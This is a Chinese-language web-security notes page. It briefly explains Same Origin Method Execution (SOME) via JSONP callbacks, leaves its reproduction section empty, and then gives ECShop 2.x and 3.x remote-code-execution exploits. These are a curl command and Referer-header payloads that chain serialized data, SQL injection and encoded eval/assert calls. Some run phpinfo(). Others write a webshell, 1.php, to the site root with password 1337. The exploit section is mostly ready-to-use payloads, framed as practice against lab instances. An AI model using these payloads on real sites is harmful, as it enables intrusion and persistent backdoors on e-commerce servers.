# Web 安全

**同源方式执行（SOME）攻击**

**原理及危害**

> json可以理解为，用户可以控制输入的一种JS函数。并且这种函数可以跨域访问。这就很恐怖了。比如某些存在父子网页的并且还为做过滤，很有可能你一点击后就会自动执行某些链接，如自动关注，点赞等。

**攻击条件**
> 存在用户可控函数点，读取用户输入执行对应javascript代码（即寻找JSONP点，通常以get方法callback名传入）

**SOME复现**

通过一个大佬写的SOME靶场来练习复现:



### ECShop <= 2.x/3.6.x/3.0.x 版本远程代码执行高危漏洞利用

[ECShop <= 2.7.x 全系列版本远程代码执行高危漏洞利用](https://www.vulnspy.com/cn-ecshop-2.7.x-rce-exploit/)

[ECShop <= 2.x/3.6.x/3.0.x 版本远程代码执行高危漏洞利用](https://www.vulnspy.com/cn-ecshop-3.x.x-rce-exploit/)

**打开 ECSHOP 实验地址**

![](PHP绕过/绕过%20disable_functions/img/4.png)

**发送 Payload 执行 phpinfo();**

`将***.vsplate.me换成您的实验地址`

在终端中执行：

`curl http://***.vsplate.me/user.php -d "action=login&vulnspy=phpinfo();exit;" -H 'Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:"num";s:207:"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:2:"id";s:9:"'"'"' union/*";s:4:"name";s:3:"ads";}45ea207d7a2b68c49582d2d22adf953a'`

EXP与一个小脚本
2.x
phpinfo():
```
Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:110:"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -";s:2:"id";s:4:"' /*";}554fcae493e564ee0dc75bdf2ebf94ca
```
webshell:
```
Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";}
```
　　会在网站根目录生成1.php，密码：1337

3.x
phpinfo():
```
Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a
```
webshell:
```
Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:289:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a
```
会在网站根目录生成1.php，密码：1337